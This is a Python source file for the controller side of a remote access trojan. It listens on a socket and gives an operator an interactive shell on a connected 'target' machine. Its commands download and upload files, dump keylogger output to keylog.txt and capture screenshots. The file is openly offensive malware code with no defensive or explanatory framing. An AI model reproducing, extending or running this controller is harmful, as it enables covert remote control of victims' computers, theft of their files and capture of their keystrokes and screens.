import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.sendall(f.read())
    target.send(b"END_OF_FILE") 
    print(f"[+] File uploaded: {file_name}")

def download_file(file_name):
    with open(file_name, 'wb') as f:
        while True:
            chunk = target.recv(1024)
            if chunk.endswith(b"END_OF_FILE"):
                f.write(chunk[:-11])
                break
            f.write(chunk)
    print(f"[+] File downloaded: {file_name}")

def receive_screenshot(file_name):
    with open(file_name, 'wb') as f:
        while True:
            chunk = target.recv(1024)
            if chunk.endswith(b"END_OF_SCREENSHOT"):
                f.write(chunk[:-16])
                break
            f.write(chunk)
    print("[+] Screenshot saved as screenshot.png")

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'keylog_start':
            pass
        elif command == 'keylog_dump':
            result = reliable_recv()
            with open("keylog.txt", "a") as f:
                f.write(result + "\n")
            print("[+] Keylog data saved to keylog.txt")
        elif command == 'screenshot':
            receive_screenshot('screenshot.png')
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.219', 5555))  # Replace with your server IP
print('[+] Listening for incoming connections...')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))
target_communication()